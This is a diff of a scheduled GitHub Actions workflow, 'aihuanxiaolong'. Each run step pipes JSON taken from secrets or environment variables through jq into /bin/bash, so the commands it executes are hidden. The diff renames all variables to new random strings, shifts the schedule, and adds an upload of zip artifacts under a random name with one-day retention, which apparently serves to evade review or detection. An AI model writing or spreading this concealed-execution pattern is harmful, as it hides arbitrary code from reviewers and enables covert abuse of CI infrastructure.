@@ -1,27 +1,25 @@
 name: aihuanxiaolong
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '19 4/6 * * *'
 
-jobs:  # 31710
+  schedule:
+    - cron: '9 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: aihuanxiaolong
         env:
-          nlks13871: ${{ secrets.nlks13871 }}
+          nsgt2336: ${{ secrets.nsgt2336 }}
         run: |
-          echo $nlks13871 | jq -r .yfhd3390 | /bin/bash
-          echo $tgwnt17958 | jq -r .ghrn2 | /bin/bash
-          echo $gxggx024 | jq -r .lyesm9 | /bin/bash
-          echo $c69 | jq -r .lnra29509 | /bin/bash
-          echo $dabhv5 | jq -r .wdwdc25393 | /bin/bash
-          echo $jh0434 | jq -r .ozs2907 | /bin/bash
-          echo $twi4 | jq -r .z3 | /bin/bash
-          echo $nryz3241 | jq -r .puct183 | /bin/bash
-          echo $qlnx45 | jq -r .mf60699 | /bin/bash
-          echo $wgw38242 | jq -r .taji864 | /bin/bash
+          printf '%s' "$nsgt2336" | jq -r .ipynd2922 | /bin/bash
+          printf '%s' "$x15765" | jq -r .mio750 | /bin/bash
+          printf '%s' "$ge0" | jq -r .dgkp558 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: UjmXqj80
+          path: "*.zip"
+          retention-days: 1
